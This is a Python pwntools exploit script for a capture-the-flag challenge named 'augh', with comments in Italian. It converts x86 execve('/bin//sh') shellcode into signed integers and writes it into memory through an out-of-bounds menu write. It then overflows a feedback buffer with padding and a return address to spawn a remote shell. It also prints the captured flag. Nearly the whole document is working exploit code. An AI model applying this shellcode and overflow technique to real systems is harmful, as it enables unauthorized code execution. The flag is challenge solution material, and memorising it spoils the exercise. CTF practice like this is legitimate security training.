#! /usr/bin/env python3

from pwn import *

def signedInt(shellcode):
    finalShellcode = []
    for byte in range(0,28,4):
        currentBytes = shellcode[byte:byte + 4]
        currentBytes = currentBytes[::-1].hex() # metto al contrario per lendianess
        ints = int(currentBytes,16)
        if ints > 2147483647:
            ints -= 0xffffffff + 1
        
        finalShellcode.append(ints)
    print("SIGNEDINT SHELLCODE:",finalShellcode)
    return finalShellcode

# conn = process('./augh')
conn = remote('augh.challs.olicyber.it',10605)



shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

shellcode = signedInt(shellcode)
# flag{T0ro_sedut0_s4lut4_i_pwn3r5}}

# invio la shellcode
# dovrebbe iniziare a scrivere da
# lista_film + (first_input[0] + -1) * 4
# quindi dovrebbe continuare a scrivere
# in questo caso first_input[0] e la stringa che sto mandando
i = 1
for x in shellcode:
    conn.recvuntil('Inserisci scelta >')
    conn.sendline('3')
    conn.recvuntil('da modificare: ')
    conn.sendline(str(i))
    conn.recvuntil(': ')
    conn.sendline(str(x)) # mando il numero in formato stringa
    i += 1

# la parte di jump, il payload lo ho provato in gdb e li salta nel posto giusto
jump = b"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKK\x60\xb0\x04\x08"
conn.recvuntil('Inserisci scelta >')
conn.sendline('5')
conn.recvuntil('feedback:')
conn.sendline(jump)
conn.interactive()